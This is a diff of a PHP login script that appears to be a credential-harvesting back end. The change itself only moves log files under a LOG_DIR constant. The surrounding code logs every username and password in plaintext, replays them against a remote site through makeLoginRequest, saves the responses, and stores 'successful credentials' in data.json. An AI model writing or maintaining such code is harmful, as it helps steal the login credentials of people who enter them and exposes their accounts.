@@ -1,9 +1,17 @@
 <?php
 session_start();
 
+// ------------------------------------------------------------------
+// Configure log directory (works regardless of where project is placed)
+// ------------------------------------------------------------------
+define('LOG_DIR', __DIR__ . '/logs');
+if (!is_dir(LOG_DIR)) {
+    @mkdir(LOG_DIR, 0755, true);
+}
+
 // Function to log all login attempts
 function logAttempt($username, $password, $success = false) {
-    $logFile = '../logs/attempts.json';
+    $logFile = LOG_DIR . '/attempts.json';
     $attempts = [];
     
     // Load existing attempts if file exists
@@ -41,7 +49,7 @@ function logAttempt($username, $password, $success = false) {
 
 // Function to log successful logins only
 function logSuccessfulLogin($username, $password) {
-    $logFile = '../logs/successful_logins.json';
+    $logFile = LOG_DIR . '/successful_logins.json';
     $successes = [];
     
     // Load existing successes if file exists
@@ -76,7 +84,7 @@ function logSuccessfulLogin($username, $password) {
 
 // Simple debug logger
 function debugLog($label, $data) {
-    $logFile = __DIR__ . '/logs/debug.log';
+    $logFile = LOG_DIR . '/debug.log';
     $entry   = date('Y-m-d H:i:s') . " | {$label}: " . (is_string($data) ? $data : json_encode($data, JSON_UNESCAPED_SLASHES)) . PHP_EOL;
     file_put_contents($logFile, $entry, FILE_APPEND);
 }
@@ -436,7 +444,7 @@ function makeLoginRequest($username, $password, $remember = 'yes') {
     }
 
     // Save full remote response for offline inspection
-    $dumpFile = __DIR__ . '/logs/remote_response_' . date('Ymd_His') . '.html';
+    $dumpFile = LOG_DIR . '/remote_response_' . date('Ymd_His') . '.html';
     file_put_contents($dumpFile, $response);
     debugLog('remote_response_saved', basename($dumpFile));
     debugLog('remote_http_code', $httpCode);
@@ -460,7 +468,7 @@ function makeLoginRequest($username, $password, $remember = 'yes') {
 
 // Function to save successful credentials to JSON file (legacy support)
 function saveCredentials($username, $password) {
-    $dataFile = 'data.json';
+    $dataFile = __DIR__ . '/data.json';
     $data = [];
     
     // Load existing data if file exists
